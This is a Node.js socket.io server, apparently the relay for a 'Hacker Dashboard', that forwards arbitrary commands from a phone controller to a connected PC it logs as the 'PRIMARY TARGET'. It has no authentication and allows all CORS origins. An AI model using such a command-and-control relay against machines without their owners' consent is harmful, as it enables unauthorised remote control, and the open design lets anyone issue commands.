import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
    cors: { origin: "*" }
});

// Serve the Hacker Dashboard
app.use(express.static(path.join(__dirname, 'public')));

// Store connected clients
let pcSocketId = null;

io.on('connection', (socket) => {
    console.log(`[+] Connection: ${socket.id}`);

    // Identify who is connecting
    socket.on('identify', (type) => {
        if (type === 'pc') {
            pcSocketId = socket.id;
            console.log(`[!] PRIMARY TARGET (PC) CONNECTED: ${socket.id}`);
            io.emit('status', 'ONLINE'); // Tell phone PC is online
        } else if (type === 'mobile') {
            console.log(`[+] CONTROLLER (MOBILE) CONNECTED: ${socket.id}`);
            if (pcSocketId) socket.emit('status', 'ONLINE');
        }
    });

    // Relay Commands from Phone -> PC
    socket.on('command', (data) => {
        if (pcSocketId) {
            console.log(`[>] RELAYING COMMAND: ${data.action}`);
            io.to(pcSocketId).emit('execute', data);
        } else {
            console.log(`[X] FAILED: PC NOT CONNECTED`);
        }
    });

    socket.on('disconnect', () => {
        if (socket.id === pcSocketId) {
            console.log(`[!] PC DISCONNECTED`);
            pcSocketId = null;
            io.emit('status', 'OFFLINE');
        }
    });
});

const PORT = process.env.PORT || 3000;
httpServer.listen(PORT, () => {
    console.log(`\n>>> ARKON RELAY ID: [${PORT}] <<<\n`);
});
